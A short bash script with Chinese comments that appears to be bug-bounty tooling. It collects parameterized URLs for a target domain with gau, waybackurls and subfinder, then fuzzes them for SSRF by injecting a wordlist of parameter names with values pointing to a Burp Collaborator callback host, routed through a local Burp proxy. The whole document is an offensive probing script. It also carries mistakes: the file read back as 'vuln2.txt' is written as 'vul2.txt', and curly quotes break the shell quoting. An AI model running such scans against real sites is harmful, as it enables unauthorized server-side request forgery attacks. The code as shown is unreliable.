#!/bin/bash
# 收集uri并制作fuzz字典
gau -subs example.com >> vul1.txt
waybackurls example.com >> vul2.txt
subfinder -d example.com -silent | waybackurls >> vul3.txt
cat vul1.txt vuln2.txt vul3.txt | grep “=” | sort -u | grep “?” | httpx -silent >> FUZZvul.txt
# ssrf fuzz 使用httpx指定burp代理
xargs -a /root/magicparameter/ssrf.txt -I@ bash -c ‘for url in $(cat FUZZvul.txt); do echo “$url&@=http://burpcollabrator.net”;done’ | httpx -http-proxy http://127.0.0.1:8080
